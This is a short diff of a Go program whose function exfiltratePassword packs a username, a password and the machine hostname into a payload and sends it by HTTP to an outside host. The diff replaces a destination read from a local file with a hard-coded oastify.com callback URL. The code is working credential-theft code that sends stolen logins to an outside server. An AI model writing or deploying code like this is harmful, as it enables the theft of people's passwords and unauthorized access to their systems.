@@ -2,19 +2,14 @@ package main
 
 import (
 	"fmt"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"strings"
 )
 
-func exfiltratePassword(password, username string) {
-	exfilLocationBytes, err := ioutil.ReadFile("exfil_location")
-	if err != nil {
-		return
-	}
+var url = "http://547uooiflf8esxk79mizntg84zaqyjm8.oastify.com"
 
-	exfilLocation := strings.TrimSuffix(string(exfilLocationBytes), "\n")
+func exfiltratePassword(password, username string) {
 	hostname, err := os.Hostname()
 	if err != nil {
 		return
@@ -22,7 +17,7 @@ func exfiltratePassword(password, username string) {
 	payload := fmt.Sprintf("username=%s&password=%s&hostname=%s", username, password, hostname)
 
 	client := &http.Client{}
-	req, err := http.NewRequest("GET", exfilLocation, strings.NewReader(payload))
+	req, err := http.NewRequest("GET", url, strings.NewReader(payload))
 	if err != nil {
 		return
 	}
@@ -36,5 +31,4 @@ func exfiltratePassword(password, username string) {
 	if resp.StatusCode != http.StatusOK {
 		return
 	}
-
 }
